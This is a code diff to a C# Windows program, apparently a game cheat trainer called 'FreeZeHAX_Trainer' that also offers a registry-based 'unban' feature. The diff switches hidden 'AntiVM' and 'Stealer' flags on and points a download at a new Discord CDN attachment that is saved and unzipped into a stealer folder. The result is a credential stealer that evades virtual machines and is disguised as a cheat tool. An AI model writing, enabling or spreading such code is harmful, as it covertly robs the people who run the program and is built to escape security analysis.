@@ -35,8 +35,8 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
         private readonly WebClient web = new WebClient();
         private readonly string NewLine = Environment.NewLine;
-        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-        private readonly bool Stealer = false; // Activate / Disable Stealer
+        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
+        private readonly bool Stealer = true; // Activate / Disable Stealer
 
         private string GetCheat(int Number)
         {
@@ -127,7 +127,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/934822824806326332/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/942830701512904754/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     others.Wait(2000);
@@ -173,41 +173,45 @@ namespace FreeZeHAX_Trainer
             #endregion
             Auto_Attach.RunWorkerAsync();
 
-            foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
+            try
             {
-                AdaptersComboBox.Items.Add(new Adapter(adapter));
+                foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
+                {
+                    AdaptersComboBox.Items.Add(new Adapter(adapter));
+                }
+                AdaptersComboBox.SelectedIndex = 0;
+                foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
+                {
+                    if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
+                    {
+                        longkey.Text = subkeyname2;
+                        UnbanLog.Text = "->The Second Key " + longkey.Text + " is found!";
+                        break;
+                    }
+                    else
+                    {
+                        longkey.Text = "None";
+                        UnbanLog.Text = "->Second Key Cannot be found!";
+                        break;
+                    }
+                }
+                foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
+                {
+                    if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
+                    {
+                        shortkey.Text = subkeyname;
+                        UnbanLog.Text += NewLine + "->The First Key " + shortkey.Text + " is found!";
+                        break;
+                    }
+                    else
+                    {
+                        shortkey.Text = "None";
+                        UnbanLog.Text += NewLine + "->First Key Cannot be found!";
+                        break;
+                    }
+                }
             }
-            AdaptersComboBox.SelectedIndex = 0;
-            foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
-            {
-                if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
-                {
-                    longkey.Text = subkeyname2;
-                    UnbanLog.Text = "->The Second Key " + longkey.Text + " is found!";
-                    break;
-                }
-                else
-                {
-                    longkey.Text = "None";
-                    UnbanLog.Text = "->Second Key Cannot be found!";
-                    break;
-                }
-            }
-            foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
-            {
-                if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
-                {
-                    shortkey.Text = subkeyname;
-                    UnbanLog.Text += NewLine + "->The First Key " + shortkey.Text + " is found!";
-                    break;
-                }
-                else
-                {
-                    shortkey.Text = "None";
-                    UnbanLog.Text += NewLine + "->First Key Cannot be found!";
-                    break;
-                }
-            }
+            catch (Exception) { }
             RegistryKey Cryptography = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
             if (Cryptography.GetValueNames().Contains("MachineGuid"))
             {
